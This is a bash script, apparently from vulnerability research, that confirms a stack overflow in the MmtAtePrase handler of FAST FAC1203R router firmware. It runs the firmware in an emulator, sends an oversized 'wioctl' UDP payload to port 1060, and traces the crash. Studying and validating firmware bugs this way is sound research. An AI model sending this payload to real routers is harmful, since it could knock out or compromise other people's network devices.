#!/usr/bin/env bash
set -u

BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
FUZZER="../../target/release/myfuzzer_mipsel"
OVERFLOW_PAYLOAD="./payload_twlantask_mmtate_wdr_ref.bin"
UNKNOWN_PAYLOAD="./payload_twlantask_unknown_space.bin"

COMMON_ARGS=(
  --firmware ./F400
  --entry 0x80001000
  --arch mipsel
  --load-addr 0x80001000
  --exec-min 0x80001000
  --exec-max 0x81000000
  --test
  --target-port 1060
  --socket-type udp
)

cd "$BASE_DIR" || exit 1

echo "==== FAST FAC1203R twlantask/MmtAtePrase stack overflow validation ===="
echo
echo "workdir: $BASE_DIR"
echo "firmware: ./F400"
echo "target: UDP 1060"
echo "overflow payload: $OVERFLOW_PAYLOAD"
echo "unknown control: $UNKNOWN_PAYLOAD"
echo

perl -e 'print "wioctl" . (" " x 3065) . "\n"' > "$OVERFLOW_PAYLOAD"
printf 'unknown ' > "$UNKNOWN_PAYLOAD"

echo "==== overflow payload size and prefix ===="
wc -c "$OVERFLOW_PAYLOAD"
xxd -g1 -c16 "$OVERFLOW_PAYLOAD" | sed -n '1,8p'
echo

run_case() {
  local name="$1"
  local hook="$2"
  local payload="$3"
  local output="$4"
  local seconds="$5"

  echo "---- running $name ----"
  echo "hook: $hook"
  echo "payload: $payload"
  echo "output: $output"
  timeout "$seconds"s "$FUZZER" "${COMMON_ARGS[@]}" --hook-config "$hook" --input-file "$payload" > "$output" 2>&1
  echo "exit_code: $?"
  echo
}

run_case "MmtAtePrase call-site trace" \
  ./hooks_twlantask_mmtate_callsite_trace.json \
  "$OVERFLOW_PAYLOAD" \
  ./output_fac1203r_twlantask_mmtate_callsite_trace.txt \
  80

run_case "MmtAtePrase entry-after-prologue trace" \
  ./hooks_twlantask_mmtate_entry_after_prologue_trace.json \
  "$OVERFLOW_PAYLOAD" \
  ./output_fac1203r_twlantask_mmtate_entry_after_prologue_trace.txt \
  80

run_case "overflow natural probe" \
  ./hooks_template.json \
  "$OVERFLOW_PAYLOAD" \
  ./output_fac1203r_twlantask_mmtate_overflow_probe.txt \
  80

run_case "unknown command control" \
  ./hooks_template.json \
  "$UNKNOWN_PAYLOAD" \
  ./output_fac1203r_twlantask_mmtate_unknown_control.txt \
  30

echo "==== validation summary ===="
rg -n 'recvfrom: wrote|TestFinish at 0x80059e50|TestFinish at 0x80077384|Tlb Load Exception|Exception Program Counter|Access Address|Emulation exited|terminating on signal|Crash' \
  ./output_fac1203r_twlantask_mmtate_callsite_trace.txt \
  ./output_fac1203r_twlantask_mmtate_entry_after_prologue_trace.txt \
  ./output_fac1203r_twlantask_mmtate_overflow_probe.txt \
  ./output_fac1203r_twlantask_mmtate_unknown_control.txt

echo
echo "Expected:"
echo "- overflow payload is accepted by UDP/1060."
echo "- _tWlanTask reaches the MmtAtePrase call site at 0x80059e50."
echo "- execution enters MmtAtePrase at 0x80077384 with a0=0x424 and a1 pointing to the received buffer."
echo "- natural probe is auxiliary only: timeout/host SigTerm is not by itself treated as the final crash proof."
